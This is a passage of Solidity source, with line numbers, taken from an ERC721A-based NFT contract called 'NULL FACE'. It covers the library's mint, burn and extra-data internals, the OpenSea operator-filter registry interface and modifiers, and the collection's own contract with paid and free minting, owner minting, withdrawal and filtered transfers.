1042         if (quantity == 0) revert MintZeroQuantity();
1043 
1044         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1045 
1046         // Overflows are incredibly unrealistic.
1047         // `balance` and `numberMinted` have a maximum limit of 2**64.
1048         // `tokenId` has a maximum limit of 2**256.
1049         unchecked {
1050             // Updates:
1051             // - `balance += quantity`.
1052             // - `numberMinted += quantity`.
1053             //
1054             // We can directly add to the `balance` and `numberMinted`.
1055             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1056 
1057             // Updates:
1058             // - `address` to the owner.
1059             // - `startTimestamp` to the timestamp of minting.
1060             // - `burned` to `false`.
1061             // - `nextInitialized` to `quantity == 1`.
1062             _packedOwnerships[startTokenId] = _packOwnershipData(
1063                 to,
1064                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1065             );
1066 
1067             uint256 toMasked;
1068             uint256 end = startTokenId + quantity;
1069 
1070             // Use assembly to loop and emit the `Transfer` event for gas savings.
1071             // The duplicated `log4` removes an extra check and reduces stack juggling.
1072             // The assembly, together with the surrounding Solidity code, have been
1073             // delicately arranged to nudge the compiler into producing optimized opcodes.
1074             assembly {
1075                 // Mask `to` to the lower 160 bits, in case the upper bits somehow aren't clean.
1076                 toMasked := and(to, _BITMASK_ADDRESS)
1077                 // Emit the `Transfer` event.
1078                 log4(
1079                     0, // Start of data (0, since no data).
1080                     0, // End of data (0, since no data).
1081                     _TRANSFER_EVENT_SIGNATURE, // Signature.
1082                     0, // `address(0)`.
1083                     toMasked, // `to`.
1084                     startTokenId // `tokenId`.
1085                 )
1086 
1087                 // The `iszero(eq(,))` check ensures that large values of `quantity`
1088                 // that overflows uint256 will make the loop run out of gas.
1089                 // The compiler will optimize the `iszero` away for performance.
1090                 for {
1091                     let tokenId := add(startTokenId, 1)
1092                 } iszero(eq(tokenId, end)) {
1093                     tokenId := add(tokenId, 1)
1094                 } {
1095                     // Emit the `Transfer` event. Similar to above.
1096                     log4(0, 0, _TRANSFER_EVENT_SIGNATURE, 0, toMasked, tokenId)
1097                 }
1098             }
1099             if (toMasked == 0) revert MintToZeroAddress();
1100 
1101             _currentIndex = end;
1102         }
1103         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1104     }
1105 
1106     /**
1107      * @dev Mints `quantity` tokens and transfers them to `to`.
1108      *
1109      * This function is intended for efficient minting only during contract creation.
1110      *
1111      * It emits only one {ConsecutiveTransfer} as defined in
1112      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309),
1113      * instead of a sequence of {Transfer} event(s).
1114      *
1115      * Calling this function outside of contract creation WILL make your contract
1116      * non-compliant with the ERC721 standard.
1117      * For full ERC721 compliance, substituting ERC721 {Transfer} event(s) with the ERC2309
1118      * {ConsecutiveTransfer} event is only permissible during contract creation.
1119      *
1120      * Requirements:
1121      *
1122      * - `to` cannot be the zero address.
1123      * - `quantity` must be greater than 0.
1124      *
1125      * Emits a {ConsecutiveTransfer} event.
1126      */
1127     function _mintERC2309(address to, uint256 quantity) internal virtual {
1128         uint256 startTokenId = _currentIndex;
1129         if (to == address(0)) revert MintToZeroAddress();
1130         if (quantity == 0) revert MintZeroQuantity();
1131         if (quantity > _MAX_MINT_ERC2309_QUANTITY_LIMIT) revert MintERC2309QuantityExceedsLimit();
1132 
1133         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1134 
1135         // Overflows are unrealistic due to the above check for `quantity` to be below the limit.
1136         unchecked {
1137             // Updates:
1138             // - `balance += quantity`.
1139             // - `numberMinted += quantity`.
1140             //
1141             // We can directly add to the `balance` and `numberMinted`.
1142             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1143 
1144             // Updates:
1145             // - `address` to the owner.
1146             // - `startTimestamp` to the timestamp of minting.
1147             // - `burned` to `false`.
1148             // - `nextInitialized` to `quantity == 1`.
1149             _packedOwnerships[startTokenId] = _packOwnershipData(
1150                 to,
1151                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1152             );
1153 
1154             emit ConsecutiveTransfer(startTokenId, startTokenId + quantity - 1, address(0), to);
1155 
1156             _currentIndex = startTokenId + quantity;
1157         }
1158         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1159     }
1160 
1161     /**
1162      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1163      *
1164      * Requirements:
1165      *
1166      * - If `to` refers to a smart contract, it must implement
1167      * {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1168      * - `quantity` must be greater than 0.
1169      *
1170      * See {_mint}.
1171      *
1172      * Emits a {Transfer} event for each mint.
1173      */
1174     function _safeMint(
1175         address to,
1176         uint256 quantity,
1177         bytes memory _data
1178     ) internal virtual {
1179         _mint(to, quantity);
1180 
1181         unchecked {
1182             if (to.code.length != 0) {
1183                 uint256 end = _currentIndex;
1184                 uint256 index = end - quantity;
1185                 do {
1186                     if (!_checkContractOnERC721Received(address(0), to, index++, _data)) {
1187                         revert TransferToNonERC721ReceiverImplementer();
1188                     }
1189                 } while (index < end);
1190                 // Reentrancy protection.
1191                 if (_currentIndex != end) revert();
1192             }
1193         }
1194     }
1195 
1196     /**
1197      * @dev Equivalent to `_safeMint(to, quantity, '')`.
1198      */
1199     function _safeMint(address to, uint256 quantity) internal virtual {
1200         _safeMint(to, quantity, '');
1201     }
1202 
1203     // =============================================================
1204     //                        BURN OPERATIONS
1205     // =============================================================
1206 
1207     /**
1208      * @dev Equivalent to `_burn(tokenId, false)`.
1209      */
1210     function _burn(uint256 tokenId) internal virtual {
1211         _burn(tokenId, false);
1212     }
1213 
1214     /**
1215      * @dev Destroys `tokenId`.
1216      * The approval is cleared when the token is burned.
1217      *
1218      * Requirements:
1219      *
1220      * - `tokenId` must exist.
1221      *
1222      * Emits a {Transfer} event.
1223      */
1224     function _burn(uint256 tokenId, bool approvalCheck) internal virtual {
1225         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
1226 
1227         address from = address(uint160(prevOwnershipPacked));
1228 
1229         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
1230 
1231         if (approvalCheck) {
1232             // The nested ifs save around 20+ gas over a compound boolean condition.
1233             if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
1234                 if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
1235         }
1236 
1237         _beforeTokenTransfers(from, address(0), tokenId, 1);
1238 
1239         // Clear approvals from the previous owner.
1240         assembly {
1241             if approvedAddress {
1242                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
1243                 sstore(approvedAddressSlot, 0)
1244             }
1245         }
1246 
1247         // Underflow of the sender's balance is impossible because we check for
1248         // ownership above and the recipient's balance can't realistically overflow.
1249         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
1250         unchecked {
1251             // Updates:
1252             // - `balance -= 1`.
1253             // - `numberBurned += 1`.
1254             //
1255             // We can directly decrement the balance, and increment the number burned.
1256             // This is equivalent to `packed -= 1; packed += 1 << _BITPOS_NUMBER_BURNED;`.
1257             _packedAddressData[from] += (1 << _BITPOS_NUMBER_BURNED) - 1;
1258 
1259             // Updates:
1260             // - `address` to the last owner.
1261             // - `startTimestamp` to the timestamp of burning.
1262             // - `burned` to `true`.
1263             // - `nextInitialized` to `true`.
1264             _packedOwnerships[tokenId] = _packOwnershipData(
1265                 from,
1266                 (_BITMASK_BURNED | _BITMASK_NEXT_INITIALIZED) | _nextExtraData(from, address(0), prevOwnershipPacked)
1267             );
1268 
1269             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
1270             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
1271                 uint256 nextTokenId = tokenId + 1;
1272                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
1273                 if (_packedOwnerships[nextTokenId] == 0) {
1274                     // If the next slot is within bounds.
1275                     if (nextTokenId != _currentIndex) {
1276                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
1277                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
1278                     }
1279                 }
1280             }
1281         }
1282 
1283         emit Transfer(from, address(0), tokenId);
1284         _afterTokenTransfers(from, address(0), tokenId, 1);
1285 
1286         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1287         unchecked {
1288             _burnCounter++;
1289         }
1290     }
1291 
1292     // =============================================================
1293     //                     EXTRA DATA OPERATIONS
1294     // =============================================================
1295 
1296     /**
1297      * @dev Directly sets the extra data for the ownership data `index`.
1298      */
1299     function _setExtraDataAt(uint256 index, uint24 extraData) internal virtual {
1300         uint256 packed = _packedOwnerships[index];
1301         if (packed == 0) revert OwnershipNotInitializedForExtraData();
1302         uint256 extraDataCasted;
1303         // Cast `extraData` with assembly to avoid redundant masking.
1304         assembly {
1305             extraDataCasted := extraData
1306         }
1307         packed = (packed & _BITMASK_EXTRA_DATA_COMPLEMENT) | (extraDataCasted << _BITPOS_EXTRA_DATA);
1308         _packedOwnerships[index] = packed;
1309     }
1310 
1311     /**
1312      * @dev Called during each token transfer to set the 24bit `extraData` field.
1313      * Intended to be overridden by the cosumer contract.
1314      *
1315      * `previousExtraData` - the value of `extraData` before transfer.
1316      *
1317      * Calling conditions:
1318      *
1319      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1320      * transferred to `to`.
1321      * - When `from` is zero, `tokenId` will be minted for `to`.
1322      * - When `to` is zero, `tokenId` will be burned by `from`.
1323      * - `from` and `to` are never both zero.
1324      */
1325     function _extraData(
1326         address from,
1327         address to,
1328         uint24 previousExtraData
1329     ) internal view virtual returns (uint24) {}
1330 
1331     /**
1332      * @dev Returns the next extra data for the packed ownership data.
1333      * The returned result is shifted into position.
1334      */
1335     function _nextExtraData(
1336         address from,
1337         address to,
1338         uint256 prevOwnershipPacked
1339     ) private view returns (uint256) {
1340         uint24 extraData = uint24(prevOwnershipPacked >> _BITPOS_EXTRA_DATA);
1341         return uint256(_extraData(from, to, extraData)) << _BITPOS_EXTRA_DATA;
1342     }
1343 
1344     // =============================================================
1345     //                       OTHER OPERATIONS
1346     // =============================================================
1347 
1348     /**
1349      * @dev Returns the message sender (defaults to `msg.sender`).
1350      *
1351      * If you are writing GSN compatible contracts, you need to override this function.
1352      */
1353     function _msgSenderERC721A() internal view virtual returns (address) {
1354         return msg.sender;
1355     }
1356 
1357     /**
1358      * @dev Converts a uint256 to its ASCII string decimal representation.
1359      */
1360     function _toString(uint256 value) internal pure virtual returns (string memory str) {
1361         assembly {
1362             // The maximum value of a uint256 contains 78 digits (1 byte per digit), but
1363             // we allocate 0xa0 bytes to keep the free memory pointer 32-byte word aligned.
1364             // We will need 1 word for the trailing zeros padding, 1 word for the length,
1365             // and 3 words for a maximum of 78 digits. Total: 5 * 0x20 = 0xa0.
1366             let m := add(mload(0x40), 0xa0)
1367             // Update the free memory pointer to allocate.
1368             mstore(0x40, m)
1369             // Assign the `str` to the end.
1370             str := sub(m, 0x20)
1371             // Zeroize the slot after the string.
1372             mstore(str, 0)
1373 
1374             // Cache the end of the memory to calculate the length later.
1375             let end := str
1376 
1377             // We write the string from rightmost digit to leftmost digit.
1378             // The following is essentially a do-while loop that also handles the zero case.
1379             // prettier-ignore
1380             for { let temp := value } 1 {} {
1381                 str := sub(str, 1)
1382                 // Write the character to the pointer.
1383                 // The ASCII index of the '0' character is 48.
1384                 mstore8(str, add(48, mod(temp, 10)))
1385                 // Keep dividing `temp` until zero.
1386                 temp := div(temp, 10)
1387                 // prettier-ignore
1388                 if iszero(temp) { break }
1389             }
1390 
1391             let length := sub(end, str)
1392             // Move the pointer 32 bytes leftwards to make room for the length.
1393             str := sub(str, 0x20)
1394             // Store the length.
1395             mstore(str, length)
1396         }
1397     }
1398 }
1399 
1400 
1401 interface IOperatorFilterRegistry {
1402     function isOperatorAllowed(address registrant, address operator) external view returns (bool);
1403     function register(address registrant) external;
1404     function registerAndSubscribe(address registrant, address subscription) external;
1405     function registerAndCopyEntries(address registrant, address registrantToCopy) external;
1406     function unregister(address addr) external;
1407     function updateOperator(address registrant, address operator, bool filtered) external;
1408     function updateOperators(address registrant, address[] calldata operators, bool filtered) external;
1409     function updateCodeHash(address registrant, bytes32 codehash, bool filtered) external;
1410     function updateCodeHashes(address registrant, bytes32[] calldata codeHashes, bool filtered) external;
1411     function subscribe(address registrant, address registrantToSubscribe) external;
1412     function unsubscribe(address registrant, bool copyExistingEntries) external;
1413     function subscriptionOf(address addr) external returns (address registrant);
1414     function subscribers(address registrant) external returns (address[] memory);
1415     function subscriberAt(address registrant, uint256 index) external returns (address);
1416     function copyEntriesOf(address registrant, address registrantToCopy) external;
1417     function isOperatorFiltered(address registrant, address operator) external returns (bool);
1418     function isCodeHashOfFiltered(address registrant, address operatorWithCode) external returns (bool);
1419     function isCodeHashFiltered(address registrant, bytes32 codeHash) external returns (bool);
1420     function filteredOperators(address addr) external returns (address[] memory);
1421     function filteredCodeHashes(address addr) external returns (bytes32[] memory);
1422     function filteredOperatorAt(address registrant, uint256 index) external returns (address);
1423     function filteredCodeHashAt(address registrant, uint256 index) external returns (bytes32);
1424     function isRegistered(address addr) external returns (bool);
1425     function codeHashOf(address addr) external returns (bytes32);
1426 }
1427 
1428 
1429 /**
1430  * @title  OperatorFilterer
1431  * @notice Abstract contract whose constructor automatically registers and optionally subscribes to or copies another
1432  *         registrant's entries in the OperatorFilterRegistry.
1433  * @dev    This smart contract is meant to be inherited by token contracts so they can use the following:
1434  *         - `onlyAllowedOperator` modifier for `transferFrom` and `safeTransferFrom` methods.
1435  *         - `onlyAllowedOperatorApproval` modifier for `approve` and `setApprovalForAll` methods.
1436  */
1437 abstract contract OperatorFilterer {
1438     error OperatorNotAllowed(address operator);
1439 
1440     IOperatorFilterRegistry public constant OPERATOR_FILTER_REGISTRY =
1441         IOperatorFilterRegistry(0x000000000000AAeB6D7670E522A718067333cd4E);
1442 
1443     constructor(address subscriptionOrRegistrantToCopy, bool subscribe) {
1444         // If an inheriting token contract is deployed to a network without the registry deployed, the modifier
1445         // will not revert, but the contract will need to be registered with the registry once it is deployed in
1446         // order for the modifier to filter addresses.
1447         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1448             if (subscribe) {
1449                 OPERATOR_FILTER_REGISTRY.registerAndSubscribe(address(this), subscriptionOrRegistrantToCopy);
1450             } else {
1451                 if (subscriptionOrRegistrantToCopy != address(0)) {
1452                     OPERATOR_FILTER_REGISTRY.registerAndCopyEntries(address(this), subscriptionOrRegistrantToCopy);
1453                 } else {
1454                     OPERATOR_FILTER_REGISTRY.register(address(this));
1455                 }
1456             }
1457         }
1458     }
1459 
1460     modifier onlyAllowedOperator(address from) virtual {
1461         // Check registry code length to facilitate testing in environments without a deployed registry.
1462         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1463             // Allow spending tokens from addresses with balance
1464             // Note that this still allows listings and marketplaces with escrow to transfer tokens if transferred
1465             // from an EOA.
1466             if (from == msg.sender) {
1467                 _;
1468                 return;
1469             }
1470             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), msg.sender)) {
1471                 revert OperatorNotAllowed(msg.sender);
1472             }
1473         }
1474         _;
1475     }
1476 
1477     modifier onlyAllowedOperatorApproval(address operator) virtual {
1478         // Check registry code length to facilitate testing in environments without a deployed registry.
1479         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1480             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), operator)) {
1481                 revert OperatorNotAllowed(operator);
1482             }
1483         }
1484         _;
1485     }
1486 }
1487 
1488 /**
1489  * @title  DefaultOperatorFilterer
1490  * @notice Inherits from OperatorFilterer and automatically subscribes to the default OpenSea subscription.
1491  */
1492 abstract contract TheOperatorFilterer is OperatorFilterer {
1493     address constant DEFAULT_SUBSCRIPTION = address(0x3cc6CddA760b79bAfa08dF41ECFA224f810dCeB6);
1494 
1495     constructor() OperatorFilterer(DEFAULT_SUBSCRIPTION, true) {}
1496 }
1497 
1498 
1499 contract NULLFACE is ERC721A, TheOperatorFilterer {
1500 
1501     address public owner;
1502 
1503     uint256 public maxSupply = 1000;
1504 
1505     uint256 public cost = 0.002 ether;
1506 
1507     uint256 public maxFreeNumerAddr = 1;
1508 
1509     mapping(address => uint256) _numForFree;
1510 
1511     mapping(uint256 => uint256) _numMinted;
1512 
1513     uint256 private maxPerTx;
1514 
1515     function mint_face(uint256 amount) payable public {
1516         require(totalSupply() + amount <= maxSupply);
1517         if (msg.value == 0) {
1518             _freemints(amount);
1519         } else {
1520             require(amount <= maxPerTx);
1521             require(msg.value >= amount * cost);
1522             _safeMint(msg.sender, amount);
1523         }
1524     }
1525 
1526     function _freemints(uint256 amount) internal {
1527         require(amount == 1 
1528             && _numMinted[block.number] < FreeNum() 
1529             && _numForFree[tx.origin] < maxFreeNumerAddr );
1530             _numForFree[tx.origin]++;
1531             _numMinted[block.number]++;
1532         _safeMint(msg.sender, 1);
1533     }
1534 
1535     function devmint(address rec, uint256 amount) public onlyOwner {
1536         _safeMint(rec, amount);
1537     }
1538     
1539     modifier onlyOwner {
1540         require(owner == msg.sender);
1541         _;
1542     }
1543 
1544     constructor() ERC721A("NULL FACE", "NULL") {
1545         owner = msg.sender;
1546         maxPerTx = 20;
1547     }
1548 
1549     function tokenURI(uint256 tokenId) public view override returns (string memory) {
1550         return string(abi.encodePacked("ipfs://QmZ8qiZmcV7gpWc3GZGRTMyW6mN5oeAWdWMyfS6t59FyhE/", _toString(tokenId), ".json"));
1551     }
1552 
1553     function setMaxFreePerAddr(uint256 maxTx, uint256 maxS) external onlyOwner {
1554         maxFreeNumerAddr = maxTx;
1555         maxSupply = maxS;
1556     }
1557 
1558     function FreeNum() internal returns (uint256){
1559         return (maxSupply - totalSupply()) / 12;
1560     }
1561 
1562     function withdraw() external onlyOwner {
1563         payable(msg.sender).transfer(address(this).balance);
1564     }
1565 
1566     /////////////////////////////
1567     // OPENSEA FILTER REGISTRY 
1568     /////////////////////////////
1569 
1570     function setApprovalForAll(address operator, bool approved) public override onlyAllowedOperatorApproval(operator) {
1571         super.setApprovalForAll(operator, approved);
1572     }
1573 
1574     function approve(address operator, uint256 tokenId) public payable override onlyAllowedOperatorApproval(operator) {
1575         super.approve(operator, tokenId);
1576     }
1577 
1578     function transferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1579         super.transferFrom(from, to, tokenId);
1580     }
1581 
1582     function safeTransferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1583         super.safeTransferFrom(from, to, tokenId);
1584     }
1585 
1586     function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data)
1587         public
1588         payable
1589         override
1590         onlyAllowedOperator(from)
1591     {
1592         super.safeTransferFrom(from, to, tokenId, data);
1593     }
1594 }